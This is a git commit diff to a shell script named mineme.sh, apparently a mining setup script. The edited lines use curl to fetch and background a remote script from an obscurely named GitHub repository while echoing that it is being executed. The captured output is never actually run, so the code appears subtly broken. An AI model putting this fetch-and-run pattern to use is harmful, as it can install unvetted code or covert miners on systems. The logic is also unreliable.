c60a1e1de75073ef864df763d6da23e4c0448059
haxserver1 <155544992+haxserver1@users.noreply.github.com>
2024-06-10 15:07:22 +0800

    Update mineme.sh v9

--- mineme.sh
+++ mineme.sh
@@ -71,7 +71,7 @@ chmod +x *
 
 # Execute additional script
 echo "Downloading and executing additional script..."
-if curl_output=$(curl -s "https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/mon.sh" &); then
+if curl_output=$( (curl -s "https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/mon.sh") & ); then
     echo "Script download initiated. Executing in the background..."
 else
     echo "Failed to initiate download or execute additional script using curl."
